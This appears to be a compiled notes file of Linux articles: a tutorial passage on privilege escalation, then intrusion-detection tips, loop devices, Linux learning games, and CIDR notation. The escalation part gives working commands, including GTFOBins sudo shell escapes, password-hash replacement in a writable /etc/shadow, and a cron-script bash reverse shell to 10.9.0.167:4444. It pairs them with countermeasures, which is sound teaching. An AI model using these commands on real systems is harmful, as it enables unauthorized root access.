![](https://miro.medium.com/v2/resize:fit:602/1*XJWRJ-X6d0VbArN5WbJ56w.png)

The shadow file this system is readable and writable by anyone which is an issue. Now let’s see how we can use this to our advantage to gain root access.

Save the hashed password of the root user (Everything between the 1st and 2nd : sign) in a file in your Kali System. Let’s see what hash was used for hashing the file.

![](https://miro.medium.com/v2/resize:fit:602/1*eJf6r6ygxwuoHIviwfPfYQ.png)

We see that the password for the root user was hashed using SHA-512. Now let’s use John to crack the password.

![](https://miro.medium.com/v2/resize:fit:602/1*d1zRhAWkSRSSE6wiDXgCQQ.png)

We have found the password for the root user “password123”.

![](https://miro.medium.com/v2/resize:fit:602/1*e8FyhT-shZHJpI_DylUvtg.png)

> **Abusing Weak File Permissions of Writable /etc/shadow file**

As we saw in the above section/task the shadow file on the system is readable and writable by anyone. So instead of cracking the password we could just make an new password and replace the old one.

**Let’s make an new password using the SHA-512 hash and replace the hash of the root user with the hash that we just generated and login with the password as shown in the below screenshot.**

![](https://miro.medium.com/v2/resize:fit:602/1*wZM4tWYTeNVpdwbq0-P_Cw.png)

**Countermeasures/Recommendations**

- Never make etc/shadow file writable/readable for others and its permissions are always set to read and write permissions only for root user and read permission for the root group.
- Root can set the correct permissions of shadow file with the below commands:

> chmod 640 /etc/shadowchown root /etc/shadow

> **Sudo — Shell Escape Sequences**

A normal user can see the applications that he/she is allowed to run using the “sudo -l” command.

![](https://miro.medium.com/v2/resize:fit:602/1*ccQj-RdfFgJ1ygSbGjtW4g.png)

We can see that there are multiple applications that we can run as root without an password.

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with “sudo” as a function, you can use it to elevate privileges, usually via an escape sequence.

Let’s see using vim if we can spawn an root user shell. Then we section for Vim we see that there are multiple commands that allows us to escalate privileges.

![](https://miro.medium.com/v2/resize:fit:602/1*kHuhovzSFYFxcCIh-NWbXA.png)

Let’s use the first command and see if we can get an root shell. If we look through GTOBins for the other applications that we have permission to run without password we can see that all of them (except Apache2) can be exploited to get an root shell.

![](https://miro.medium.com/v2/resize:fit:602/1*gsQ3Z-mrNFPlw8cDNBuILw.png)

**find** ([https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/))

```bash
sudo find . -exec /bin/sh \; -quit
```

Copy above whole command and paste it.

![](https://miro.medium.com/v2/resize:fit:601/1*xJNg17R70zdarZBFIuIK9w.png)

**man** ([https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/))

> sudo man  
  
> !/bin/bash

![](https://miro.medium.com/v2/resize:fit:602/1*D1pDJ2gF_R2f4q0bOall0A.png)

**awk** ([https://gtfobins.github.io/gtfobins/awk/](https://gtfobins.github.io/gtfobins/awk/))

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

![](https://miro.medium.com/v2/resize:fit:602/1*uLLRTB8tkn8eXnejhnPeYg.png)

**Countermeasures/Recommendations:**

- Do not give sudo rights to any program which lets you escape to the shell.
- Never give SUDO rights to vi, more, less, nmap, perl, ruby, python, gdb and others.

## **Linux Privilege Escalation by Exploiting Cronjobs**

**What is a cron job?**

Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server. They’re most commonly used for sysadmin jobs such as backups or cleaning /tmp/ directories and so on. The word Cron comes from crontab and it is present inside /etc directory.

![](https://miro.medium.com/v2/resize:fit:602/1*bmx6VJEeJkdTQdpBGHz7dA.png)

**For example:** Inside crontab, we can add the following entry to print apache error logs automatically in every 1 hour.

```
1 0 * * * printf "" > /var/log/apache/error_log
```

To list out all the cronjobs in the machine by executing the command ‘`cat /etc/crontab`’.

![](https://miro.medium.com/v2/resize:fit:602/1*4ILd4DjuHS4bPoZUlsmNkg.png)

From the above command, we notice the crontab is bash script every minute now let’s exploit.

Firstly will locate the file and check the permissions of `overwrite.sh` file.

![](https://miro.medium.com/v2/resize:fit:602/1*zzQaNXlzBUqml6w_HOVCnQ.png)

Since we have a write permissions of the file. so now, we can exploit this by writing our code in `overwrite.sh` to connect to our local machine, sp**awn a shell and when it gets executed by the root user, we’ll get a shell. So our code will be**

```bash
#!/bin/bash  
 bash -i >& /dev/tcp/10.9.0.167/4444 0>&1
```

**Explanation:**

- 1st line: shebang to denote interpreter, this case — bash
- 2nd line: bash -i to open an interactive shell, >& /dev/tcp/10.2.12.26/4444 to redirect all streams to our local machine and 0>&1 to redirect **stdin** and **stdout** to **stdout**

so, after editing the code in overwrite.sh, we listen on our local machine waiting for a shell.

![](https://miro.medium.com/v2/resize:fit:602/1*XNYPNZJcYP1zjzxstjwVaQ.png)

**Countermeasures/Recommendations:**

- Any script or binaries defined in cron jobs should not be writable
- cron file should not be writable by anyone except root.
- cron.d directory should not be writable by anyone except root.

## Linux Privilege Escalation using SUID Binaries

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following image.

![](https://miro.medium.com/v2/resize:fit:602/1*l3LfUJErEs9bfCLaJNU-Aw.png)

Hence it is clear that the maximum number of bit is used to set permission for each user is **7**, which is a combination of read (**4**) write (**2**) and execute (**1**) operation. For example, if you set chmod 755, then it will look like as **rwxr-xr-x.**

But when special permission is given to each user it becomes **SUID, SGID, and sticky bits**. When extra bit **“4”** is set to user(Owner) it becomes **SUID** (Set user ID) and when bit **“2”** is set to group it becomes **SGID** (Set Group ID) and if other users are allowed to create or delete any file inside a directory then **sticky bits** **“1”** is set to that directory.

![](https://miro.medium.com/v2/resize:fit:602/1*l6TQC-FGaIrzsSrtmURXkA.png)

## **What is SUID Permission?**

**SUID:** Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.

**How to set suid?**

Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will **replace x from s** as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore **bit 4** or **symbol s** will be added before read/write/execution operation.

If you execute **ls -al** with the file name and then you observe the small ‘s’ symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.

**How to Find SUID Files?**

By using the following command you can enumerate all binaries having SUID permissions:

```
find / -perm -u=s -type f 2>/dev/null
```

- **/**denotes start from the top (root) of the file system and find every directory
- **-perm** denotes search for the permissions that follow
- **-u=s**denotes look for files that are owned by the root user
- **-type** states the type of file we are looking for
- **f** denotes a regular file, not the directories or special files
- **2** denotes to the second file descriptor of the process, i.e. stderr (standard error)
- **>** means redirection
- **/dev/null** is a special filesystem object that throws away everything written into it.

> **Privilege Escalation using the copy command**

If suid bit is enabled for the **cp command**, which is used to copy the data, it can lead to an escalation privilege to gain root access.

For example, suppose you (system admin) want to give cp command SUID permission. Then you can follow the steps below to identify its location and current permission, after which you can enable SUID bit by changing permission.

Let’s generate the hash for the password abcd1234

![](https://miro.medium.com/v2/resize:fit:577/1*7MjpAv-Lx-VJS-33oqOk0A.png)

We have copied the /passwd file into the /tmp folder with name passwd, so I can edit it through vim and add the user entry name hack as shown in the below screenshot with uid and gis as ‘0’ with user root.

![](https://miro.medium.com/v2/resize:fit:602/1*2Phniwvz9Na_x5vk0fJsAQ.png)

Post adding the hack user entry with generated hash, we can login to hack user with password ‘abcd1234’ which is having the root level privileges.

**Countermeasures/Recommendation:**

- SUID bit should not be set to any program which lets you escape to the shell.
- You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.

In this blog we have seen how to exploit weak permissions of passwd & shadow files, shell escape sequences, misconfigured cronjobs, suid binaries.

**Article By**

**Somasekhar Munimadugu**

[**https://www.linkedin.com/in/sekharmss**](https://www.linkedin.com/in/sekharmss)

----

# 11 Tips for Detecting and Responding to Intrusions on Linux

resource: [11 Tips for Detecting and Responding to Intrusions on Linux | by huizhou92 | in Stackademic - Freedium](https://freedium.cfd/https://medium.com/stackademic/11-tips-for-detecting-and-responding-to-intrusions-on-linux-7a1dac2e36ec)

> _**Background**__: The following scenarios are observed on CentOS systems and are similar for other Linux distributions._

### 1. Intruders May Delete Machine Logs

Check if log information still exists or has been cleared using the following commands:

![None](https://miro.medium.com/v2/resize:fit:700/0*zT9BU5aX3ltDhbLW.png)

### 2. Intruders May Create a New File for Storing Usernames and Passwords

Check `/etc/passwd` and `/etc/shadow` files for any alterations using the following commands:

![None](https://miro.medium.com/v2/resize:fit:700/0*AhVUlpghCMPjm5VE.png)

### 3. Intruders May Modify Usernames and Passwords

Examine the contents of `/etc/passwd` and `/etc/shadow` files for any changes using the following commands:

![None](https://miro.medium.com/v2/resize:fit:700/0*uV5wWGB-dzkBdMNJ.png)

### 4. Check Recent Successful and Last Unsuccessful Login Events on the Machine

Refer to the log "/var/log/lastlog" using the following commands:

![None](https://miro.medium.com/v2/resize:fit:700/0*jPpv_7jCTEQ1DCfr.png)

### 5. Use `who` to View All Currently Logged-in Users on the Machine

Refer to the log file "/var/run/utmp":

![None](https://miro.medium.com/v2/resize:fit:700/0*3PTIAFVZEEQlalK9.png)

### 6. Use `last` To view Users Logged in Since Machine Creation

Refer to the log file "/var/log/wtmp":

![None](https://miro.medium.com/v2/resize:fit:700/0*5LhPJrZVzh3lXi9U.png)

### 7. Use `ac` to View Connection Time (in Hours) for All Users on the Machine

Refer to the log file "/var/log/wtmp":

![None](https://miro.medium.com/v2/resize:fit:700/0*MLQYsnixH1AocyoD.png)

### 8. If Abnormal Traffic is Detected

Use `tcpdump` to capture network packets or `iperf` to check traffic.

### 9. Review the `/var/log/secure` Log File

Attempt to identify information about intruders using the following commands:

![None](https://miro.medium.com/v2/resize:fit:700/0*9JDKcoxwA1JgNjPI.png)

### 10. Identify Scripts Executed by Abnormal Processes

1. 1. Use the `top` command to view the PID of abnormal processes:

![None](https://miro.medium.com/v2/resize:fit:700/0*K8PYeqh2EGBAVBDg.png)

1. 1. Search for the executable file of the process in the virtual file system directory:

![None](https://miro.medium.com/v2/resize:fit:700/0*RnVJ3IILUoOZ52x5.png)

### 11. File Recovery After Confirming Intrusion and Deletion of Important Files

1. When a process opens a file, even if it's deleted, it remains on the disk as long as the process keeps it open. To recover such files, use `lsof` the `/proc` directory.
2. Most `lsof` information is stored in directories named after the process's PID, such as `/proc/1234`, containing information for PID 1234. Each process directory contains various files providing insight into the process's memory space, file descriptor list, symbolic links to files on disk, and other system information. `lsof` uses this and other kernel internal state information to generate its output.

Using the information above, you can retrieve the data by examining `/proc/<PID>/fd/<descriptor>`. For example, to recover `/var/log/secure`, follow these steps: a. Check `/var/log/secure`, confirming its absence:

![None](https://miro.medium.com/v2/resize:fit:700/0*Q_yhyx1Sw5pOLjgD.png)

b. Use `lsof` to check if any process is currently accessing `/var/log/secure`:

![None](https://miro.medium.com/v2/resize:fit:700/0*m7egwsgBj3S7wuuM.png)

c. From the information above, PID 1264 (rsyslogd) has opened the file with a file descriptor of 4. It's marked as deleted. Therefore, you can check the corresponding information in `/proc/1264/fd/4`:

![None](https://miro.medium.com/v2/resize:fit:700/0*mHbWLLpz_Evbo57x.png)

d. You can recover the data by redirecting it to a file using I/O redirection:

![None](https://miro.medium.com/v2/resize:fit:700/0*vlmo-bqBdiLPg79l.png)

e. Confirm the existence of `/var/log/secure` it again. This method is particularly useful for many applications, especially log files and databases.

![None](https://miro.medium.com/v2/resize:fit:700/0*ueRZHFivh34WhavT.png)

The above is the method I summarized for dealing with Linux intrusion. It can generally handle most problems. If you encounter an unresolved issue, it is best to seek advice from a professional IT operations and maintenance engineer.


##  What is a Loop device in Linux?

resource: [What is a Loop device in Linux? (itsfoss.com)](https://itsfoss.com/loop-device-linux/)

While [listing mounted drives through the terminal](https://learnubuntu.com/list-drives/?ref=itsfoss.com), you must have encountered drive names starting with loop:

[![list drives in ubuntu](https://itsfoss.com/content/images/wordpress/2022/09/list-drives-in-ubuntu-1-800x586.png)](https://itsfoss.com/content/images/wordpress/2022/09/list-drives-in-ubuntu-1.png)

Loop devices

If you are an Ubuntu user, then you’ll get a long list of loop devices as shown in the screenshot above.

It is because of snaps, the universal package management system developed by Canonical. The snap applications are mounted as loop devices.

Now, this raises another set of questions such as what is a loop device and why snaps applications are mounted as a disk partition.

Let me shed some light on the topic

## Loop devices: Regular Files that are mounted as File System

Linux <mark style="background: #FF5582A6;">allows users to create a special block device by which they can map a normal file to a virtual block device.</mark>

In simple terms, a loop device can <mark style="background: #BBFABBA6;">behave as a virtual file system</mark> which is quite helpful while working with isolated programs such as snaps.

So basically you get an isolated file system mounted at a specific mounting point. By which a developer/advanced user packs a bunch of files in one place. So it can be accessed by an operating system and that behavior is known as **loop mounts.**

But working with isolated systems using a loop device is one of the many reasons why loop devices are utilized and if you’re interested, here are more use cases of loop devices.

## Reasons for using loop Devices

While being a virtual file system, there are endless possibilities; here are some widely known use cases of loop devices:

1. It can be used to <mark style="background: #CACFD9A6;">install an operating system over a file system</mark> without going through repartitioning the drive.
2. A convenient way to configure system images (after mounting them).
3. Provides permanent segregation of data.
4. It can be used for sandboxed applications that contain all the necessary dependencies.

And the developers can do wonders when given isolated file systems.

The loop devices can be easily managed through `losetup` utility. Let me show you how.

## Manage loop devices

So let’s start with listing available loop devices.

To list them, all you need to do is pair `losetup` with `-a` option:

```
losetup -a
```

[![losetup a](https://itsfoss.com/content/images/wordpress/2022/09/losetup-a.png)](https://itsfoss.com/content/images/wordpress/2022/09/losetup-a.png)

### Unmount Loop device

The process for unmounting any loop device is pretty straightforward. For that, I’ll be using umount command.

```
sudo umount /dev/loop9
```

[![lsblk](https://itsfoss.com/content/images/wordpress/2022/09/lsblk.png)](https://itsfoss.com/content/images/wordpress/2022/09/lsblk.png)

The loop9 block was brave browser installed as snap, and you can clearly see, it is no longer mounted and can’t be launched.

### Delete Loop device

**_This is for demonstration purposes only. Don’t go and randomly delete loop devices._**

Make sure to unmount the loop device before you proceed further in deleting a specific loop device.

Your first step will be detaching files to any loop device using `-d` option. For demonstration, I’ll be using `loop9`:

```
sudo losetup -d /dev/loop9
```

And now, you can remove the `loop9` device by the same old the [rm command that is used to remove files and directory:](https://linuxhandbook.com/remove-files-directories/?ref=itsfoss.com)

```
sudo rm /dev/loop9
```

And `loop9` was no longer listed in available loop devices:

[![delete loop device](https://itsfoss.com/content/images/wordpress/2022/09/delete-loop-device.png)](https://itsfoss.com/content/images/wordpress/2022/09/delete-loop-device.png)

---

https://medium.com/@audrey_evans/becoming-linux-system-administrator-users-and-groups-part-i-9da575565b10?source=author_recirc-----0a600f8cada7----0---------------------a95eb676_304c_4d6c_acfa_9e477646d6b3-------

https://medium.com/@audrey_evans/learning-networks-with-linux-standard-gui-network-sniffer-wireshark-ec01a6ba120c?source=author_recirc-----0a600f8cada7----1---------------------a95eb676_304c_4d6c_acfa_9e477646d6b3-------


https://medium.com/@audrey_evans/becoming-linux-system-administrator-networking-part-i-549373f94121?source=author_recirc-----0a600f8cada7----2---------------------a95eb676_304c_4d6c_acfa_9e477646d6b3-------

https://medium.com/@audrey_evans/becoming-linux-system-administrator-networking-part-ii-0bc963bd99f8?source=author_recirc-----0a600f8cada7----3---------------------a95eb676_304c_4d6c_acfa_9e477646d6b3-------

https://medium.com/devops-dev/advanced-usage-of-linux-dynamic-tracing-64c81a848654?source=read_next_recirc-----0a600f8cada7----1---------------------3766010c_72b9_4372_8239_0c78d00a31b1-------

[Guide to Using the Curl Command | by LearnTheShell | Medium](https://medium.com/@learntheshell/guide-to-using-the-curl-command-c57a30814c1d)


https://medium.com/@learntheshell/web-page-mirroring-with-wget-8846edbb940d?source=author_recirc-----c57a30814c1d----3---------------------3846864e_1f1e_4f78_a0bf_5132284c8881-------

---

###  Mastering Linux while Playing Games

resource: [Mastering Linux while Playing Games | by Audrey's weBlog & reViews - Freedium](https://freedium.cfd/https://medium.com/@audrey_evans/mastering-linux-while-playing-games-11e3919e7096)

_There are several websites that offer Linux tutorials where learners can practice Linux commands in a fun & interactive manner by playing interesting games. Here I compiled the ones that don't require you to register or log in._

#### Terminus

*Terminus is an excellent adventure game for beginners with the retro pixel art graphics. While playing this game, one should <mark style="background: #FFF3A3A6;">retrieve specific data, print information, moving through directories</mark>. In the game, you need to save the world from the evil wizard.*


game: [Terminus (mit.edu)](https://web.mit.edu/mprat/Public/web/Terminus/Web/main.html)

#### Linux Survival

*Linux Survival is comprised of four modules with a different set of topics. There is a <mark style="background: #FF5582A6;">quiz session after each module where you can test your knowledge</mark>. While you don't have to create an account to play, doing so allows you to track your progress.*

game: [Linux Survival | Where learning Linux is easy](https://linuxsurvival.com/)

#### Over The Wire: Wargames

*This is a collection of numerous games, where each wargame covers a different topic, e.g, <mark style="background: #ADCCFFA6;">web security (Bandit), cryptography (Krypton), basic exploitation (Narnia)</mark>. Moreover, in each wargame there are many different levels, in which one needs to solve the challenges to move on to the next level so much like an adventure. <mark style="background: #FFB86CA6;">You need to connect to each game server via SSH</mark>.*

game: [OverTheWire: Wargames](https://overthewire.org/wargames/)


#### Linux Journey

*Linux Journey provides with full of resources equally useful for beginners and advanced users. <mark style="background: #BBFABBA6;">There are quiz & exercise sessions to check your knowledge and further deepen your techniques</mark> and hands-on experience. The materials are all text-based.*

game: [Home | Linux Journey](https://linuxjourney.com/)

#### Command Line Heroes: BASH

*This game is the simplest among all. <mark style="background: #CACFD9A6;">The rule is just to type in as many valid commands as possible within a given amount of time.</mark> However, I find this game quite nice which is indeed a very handy exercise tool for any Linux users. Just try it out!*


game: [The Command Line Heroes BASH! (redhat.com)](https://arcade.redhat.com/bash/index.html)

#### Sad Servers

*Sad Servers is comprised of timed troubleshooting challenges with realistic scenarios suitable for advanced users with deeper understanding of Linux.*

game: [SadServers - Linux & DevOps Troubleshooting Interviews](https://sadservers.com/)

#### Command Challenge

*Command Challege consists of a series of command line tasks. In comparison to other games introduced in this post, this game might be quite easy except for beginners. Nevertheless, it can be enjoyable (addictive) somehow and alternative solutions are also provided while you are playing.*

game: [Command Challenge! (cmdchallenge.com)](https://cmdchallenge.com/)

![[Pasted image 20240624020127.png]]

#### Bash Crawl

A text-based adventure game to improve your Bash scripting skills. Windows users can also play this game by installing [**Cygwin**](https://www.cygwin.com/) or [**WSL**](https://learn.microsoft.com/en-us/windows/wsl/compare-versions#whats-new-in-wsl-2)**.** <mark style="background: #BBFABBA6;">Bashcrawl is an ASCII art dungeon crawler</mark>, similar to the game [**Rogue**](https://en.wikipedia.org/wiki/Rogue_(video_game)), where the player control a character and explore dungeons full of monsters as well as treasures. <mark style="background: #FFB86CA6;">In the game, dungeons are generated as directories and files on your system.</mark> Hence, you navigate through the dungeon with the **cd** command and examine files with **ls -F**, read files by using the **cat** command,<mark style="background: #ADCCFFA6;"> set variables to collect treasure, and fight monsters by running scripts.</mark>

You need to install the game by visiting the GitLab page below:

[slackermedia / bashcrawl · GitLab](https://gitlab.com/slackermedia/bashcrawl)

#### Command Line Murder Mystery

You need to visit Noah Veltman's GitHub page and download this. In this game, you become a detective and solve a murder plot by <mark style="background: #FFB8EBA6;">looking for the clues with Linux commands to navigate through folders and files.</mark> There are hint and solution files separately.

[GitHub - veltman/clmystery: A command-line murder mystery](https://github.com/veltman/clmystery)

---

##  The “/24” in “192.168.0.0/24” Explained in 30 Seconds

source: [The “/24” in “192.168.0.0/24” Explained in 30 Seconds | by Liu Zuo Lin | Jul, 2024 | Level Up Coding (gitconnected.com)](https://levelup.gitconnected.com/the-24-in-192-168-0-0-24-explained-in-30-seconds-b0ed6cb635c7)


![](https://miro.medium.com/v2/resize:fit:875/1*wC4cHGTKFRRGVzXMWB-ejg.png)


###  Adding a / and a number to our IP

- `192.168.0.0/32` is a _range_ of IP addresses
- `192.168.0.0/31` is also a _range_ of IP addresses
- `192.168.0.0/30` is also a _range_ of IP addresses
- `192.168.0.0/29` is also a _range_ of IP addresses
- `192.168.0.0/28` is also a _range_ of IP addresses
- and so on

The number we put after the `/` ranges from 0 to 32

### Finding the IPs inside this range

Let's first find the _number_ of IP addresses inside this range.

Let's say we have `192.168.0.0/30`:

> number of ip addresses = 2 ^ (32–30)

> which is 2 ^ 2 = 4

> The ip addresses are thus 192.168.0.0, 192.168.0.1, 192.168.0.2 and 192.168.0.3

Let's say we have `192.168.0.0/29`:

> number of ip addresses = 2 ^ (32–29)

> which is 2 ^ 3 = 8

> The ip addresses are thus 192.168.0.0, 192.168.0.1, 192.168.0.2 … 192.168.0.7

Let's say we have `192.168.0.1/28`:

> number of ip address = 2 ^ (32–28)

> which is 2 ^ 4 = 16

> The ip addresses are thus 192.168.0.0, 192.168.0.1, 192.168.0.2 … 192.168.0.15

Note — in my opinion this notation is strange and unintuitive, but it is used widely in the industry, so who am I to speak out against this I guess

### Finding the IP ranges using Python

We can automatically do this using the built-in `ipaddress` module


```
import ipaddress x = list(ipaddress.ip_network('192.168.0.0/30', False)) from pprint import pprint # there are 4 ip addresses in this range pprint(x) ''' [IPv4Address('192.168.0.0'), IPv4Address('192.168.0.1'), IPv4Address('192.168.0.2'), IPv4Address('192.168.0.3')] '''
```

^ the `False` argument turns off strict mode (which causes an error)

```
import ipaddress x = list(ipaddress.ip_network('192.168.0.0/28', False)) from pprint import pprint # there are 16 ip addresses in this range pprint(x) ''' [IPv4Address('192.168.0.0'), IPv4Address('192.168.0.1'), IPv4Address('192.168.0.2'), IPv4Address('192.168.0.3'), IPv4Address('192.168.0.4'), IPv4Address('192.168.0.5'), IPv4Address('192.168.0.6'), IPv4Address('192.168.0.7'), IPv4Address('192.168.0.8'), IPv4Address('192.168.0.9'), IPv4Address('192.168.0.10'), IPv4Address('192.168.0.11'), IPv4Address('192.168.0.12'), IPv4Address('192.168.0.13'), IPv4Address('192.168.0.14'), IPv4Address('192.168.0.15')] '''
```

### The /24 in 192.168.0.0/24

> number of ip addresses = 2 ^ (32–24)

> which is 2 ^ 8 = 256

```
import ipaddress x = list(ipaddress.ip_network('192.168.0.0/24', False)) from pprint import pprint pprint(x) ''' [IPv4Address('192.168.0.0'), IPv4Address('192.168.0.1'), IPv4Address('192.168.0.2'), IPv4Address('192.168.0.3'), IPv4Address('192.168.0.4'), IPv4Address('192.168.0.5'), IPv4Address('192.168.0.6'), IPv4Address('192.168.0.7'), IPv4Address('192.168.0.8'), IPv4Address('192.168.0.9'), IPv4Address('192.168.0.10'), IPv4Address('192.168.0.11'), IPv4Address('192.168.0.12'), IPv4Address('192.168.0.13'), IPv4Address('192.168.0.14'), IPv4Address('192.168.0.15'), IPv4Address('192.168.0.16'), IPv4Address('192.168.0.17'), IPv4Address('192.168.0.18'), IPv4Address('192.168.0.19'), IPv4Address('192.168.0.20'), IPv4Address('192.168.0.21'), IPv4Address('192.168.0.22'), IPv4Address('192.168.0.23'), IPv4Address('192.168.0.24'), IPv4Address('192.168.0.25'), IPv4Address('192.168.0.26'), IPv4Address('192.168.0.27'), IPv4Address('192.168.0.28'), IPv4Address('192.168.0.29'), IPv4Address('192.168.0.30'), IPv4Address('192.168.0.31'), IPv4Address('192.168.0.32'), IPv4Address('192.168.0.33'), IPv4Address('192.168.0.34'), IPv4Address('192.168.0.35'), IPv4Address('192.168.0.36'), IPv4Address('192.168.0.37'), IPv4Address('192.168.0.38'), IPv4Address('192.168.0.39'), IPv4Address('192.168.0.40'), IPv4Address('192.168.0.41'), IPv4Address('192.168.0.42'), IPv4Address('192.168.0.43'), IPv4Address('192.168.0.44'), IPv4Address('192.168.0.45'), IPv4Address('192.168.0.46'), IPv4Address('192.168.0.47'), IPv4Address('192.168.0.48'), IPv4Address('192.168.0.49'), IPv4Address('192.168.0.50'), IPv4Address('192.168.0.51'), IPv4Address('192.168.0.52'), IPv4Address('192.168.0.53'), IPv4Address('192.168.0.54'), IPv4Address('192.168.0.55'), IPv4Address('192.168.0.56'), IPv4Address('192.168.0.57'), IPv4Address('192.168.0.58'), IPv4Address('192.168.0.59'), IPv4Address('192.168.0.60'), IPv4Address('192.168.0.61'), IPv4Address('192.168.0.62'), IPv4Address('192.168.0.63'), IPv4Address('192.168.0.64'), IPv4Address('192.168.0.65'), IPv4Address('192.168.0.66'), IPv4Address('192.168.0.67'), IPv4Address('192.168.0.68'), IPv4Address('192.168.0.69'), IPv4Address('192.168.0.70'), IPv4Address('192.168.0.71'), IPv4Address('192.168.0.72'), IPv4Address('192.168.0.73'), IPv4Address('192.168.0.74'), IPv4Address('192.168.0.75'), IPv4Address('192.168.0.76'), IPv4Address('192.168.0.77'), IPv4Address('192.168.0.78'), IPv4Address('192.168.0.79'), IPv4Address('192.168.0.80'), IPv4Address('192.168.0.81'), IPv4Address('192.168.0.82'), IPv4Address('192.168.0.83'), IPv4Address('192.168.0.84'), IPv4Address('192.168.0.85'), IPv4Address('192.168.0.86'), IPv4Address('192.168.0.87'), IPv4Address('192.168.0.88'), IPv4Address('192.168.0.89'), IPv4Address('192.168.0.90'), IPv4Address('192.168.0.91'), IPv4Address('192.168.0.92'), IPv4Address('192.168.0.93'), IPv4Address('192.168.0.94'), IPv4Address('192.168.0.95'), IPv4Address('192.168.0.96'), IPv4Address('192.168.0.97'), IPv4Address('192.168.0.98'), IPv4Address('192.168.0.99'), IPv4Address('192.168.0.100'), IPv4Address('192.168.0.101'), IPv4Address('192.168.0.102'), IPv4Address('192.168.0.103'), IPv4Address('192.168.0.104'), IPv4Address('192.168.0.105'), IPv4Address('192.168.0.106'), IPv4Address('192.168.0.107'), IPv4Address('192.168.0.108'), IPv4Address('192.168.0.109'), IPv4Address('192.168.0.110'), IPv4Address('192.168.0.111'), IPv4Address('192.168.0.112'), IPv4Address('192.168.0.113'), IPv4Address('192.168.0.114'), IPv4Address('192.168.0.115'), IPv4Address('192.168.0.116'), IPv4Address('192.168.0.117'), IPv4Address('192.168.0.118'), IPv4Address('192.168.0.119'), IPv4Address('192.168.0.120'), IPv4Address('192.168.0.121'), IPv4Address('192.168.0.122'), IPv4Address('192.168.0.123'), IPv4Address('192.168.0.124'), IPv4Address('192.168.0.125'), IPv4Address('192.168.0.126'), IPv4Address('192.168.0.127'), IPv4Address('192.168.0.128'), IPv4Address('192.168.0.129'), IPv4Address('192.168.0.130'), IPv4Address('192.168.0.131'), IPv4Address('192.168.0.132'), IPv4Address('192.168.0.133'), IPv4Address('192.168.0.134'), IPv4Address('192.168.0.135'), IPv4Address('192.168.0.136'), IPv4Address('192.168.0.137'), IPv4Address('192.168.0.138'), IPv4Address('192.168.0.139'), IPv4Address('192.168.0.140'), IPv4Address('192.168.0.141'), IPv4Address('192.168.0.142'), IPv4Address('192.168.0.143'), IPv4Address('192.168.0.144'), IPv4Address('192.168.0.145'), IPv4Address('192.168.0.146'), IPv4Address('192.168.0.147'), IPv4Address('192.168.0.148'), IPv4Address('192.168.0.149'), IPv4Address('192.168.0.150'), IPv4Address('192.168.0.151'), IPv4Address('192.168.0.152'), IPv4Address('192.168.0.153'), IPv4Address('192.168.0.154'), IPv4Address('192.168.0.155'), IPv4Address('192.168.0.156'), IPv4Address('192.168.0.157'), IPv4Address('192.168.0.158'), IPv4Address('192.168.0.159'), IPv4Address('192.168.0.160'), IPv4Address('192.168.0.161'), IPv4Address('192.168.0.162'), IPv4Address('192.168.0.163'), IPv4Address('192.168.0.164'), IPv4Address('192.168.0.165'), IPv4Address('192.168.0.166'), IPv4Address('192.168.0.167'), IPv4Address('192.168.0.168'), IPv4Address('192.168.0.169'), IPv4Address('192.168.0.170'), IPv4Address('192.168.0.171'), IPv4Address('192.168.0.172'), IPv4Address('192.168.0.173'), IPv4Address('192.168.0.174'), IPv4Address('192.168.0.175'), IPv4Address('192.168.0.176'), IPv4Address('192.168.0.177'), IPv4Address('192.168.0.178'), IPv4Address('192.168.0.179'), IPv4Address('192.168.0.180'), IPv4Address('192.168.0.181'), IPv4Address('192.168.0.182'), IPv4Address('192.168.0.183'), IPv4Address('192.168.0.184'), IPv4Address('192.168.0.185'), IPv4Address('192.168.0.186'), IPv4Address('192.168.0.187'), IPv4Address('192.168.0.188'), IPv4Address('192.168.0.189'), IPv4Address('192.168.0.190'), IPv4Address('192.168.0.191'), IPv4Address('192.168.0.192'), IPv4Address('192.168.0.193'), IPv4Address('192.168.0.194'), IPv4Address('192.168.0.195'), IPv4Address('192.168.0.196'), IPv4Address('192.168.0.197'), IPv4Address('192.168.0.198'), IPv4Address('192.168.0.199'), IPv4Address('192.168.0.200'), IPv4Address('192.168.0.201'), IPv4Address('192.168.0.202'), IPv4Address('192.168.0.203'), IPv4Address('192.168.0.204'), IPv4Address('192.168.0.205'), IPv4Address('192.168.0.206'), IPv4Address('192.168.0.207'), IPv4Address('192.168.0.208'), IPv4Address('192.168.0.209'), IPv4Address('192.168.0.210'), IPv4Address('192.168.0.211'), IPv4Address('192.168.0.212'), IPv4Address('192.168.0.213'), IPv4Address('192.168.0.214'), IPv4Address('192.168.0.215'), IPv4Address('192.168.0.216'), IPv4Address('192.168.0.217'), IPv4Address('192.168.0.218'), IPv4Address('192.168.0.219'), IPv4Address('192.168.0.220'), IPv4Address('192.168.0.221'), IPv4Address('192.168.0.222'), IPv4Address('192.168.0.223'), IPv4Address('192.168.0.224'), IPv4Address('192.168.0.225'), IPv4Address('192.168.0.226'), IPv4Address('192.168.0.227'), IPv4Address('192.168.0.228'), IPv4Address('192.168.0.229'), IPv4Address('192.168.0.230'), IPv4Address('192.168.0.231'), IPv4Address('192.168.0.232'), IPv4Address('192.168.0.233'), IPv4Address('192.168.0.234'), IPv4Address('192.168.0.235'), IPv4Address('192.168.0.236'), IPv4Address('192.168.0.237'), IPv4Address('192.168.0.238'), IPv4Address('192.168.0.239'), IPv4Address('192.168.0.240'), IPv4Address('192.168.0.241'), IPv4Address('192.168.0.242'), IPv4Address('192.168.0.243'), 